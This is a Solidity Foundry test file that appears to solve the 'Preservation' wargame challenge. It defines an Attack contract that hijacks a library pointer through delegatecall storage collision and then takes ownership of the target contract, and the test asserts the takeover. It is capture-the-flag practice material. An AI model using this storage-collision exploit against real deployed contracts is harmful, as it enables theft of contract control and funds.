// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/16_Preservation.sol";

contract PreservationTest is Test {
    Preservation instance;
    LibraryContract instance1;
    Attack attack;
    address player1;
    address player2;

    function setUp() public {
        player1 = vm.addr(1);
        player2 = vm.addr(2);

        attack = new Attack();
        instance1 = new LibraryContract();
        instance = new Preservation(address(instance1), player1);
    }

    function testattacker() public {
        vm.startPrank(player1, player1);

        instance.setFirstTime(uint(uint160(address(attack))));
        instance.setFirstTime(uint(uint160(address(player2))));
        assertEq(instance.owner(), player2);
        vm.stopPrank();
    }
}

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 time) public {
        owner = address(uint160(time));
    }
}
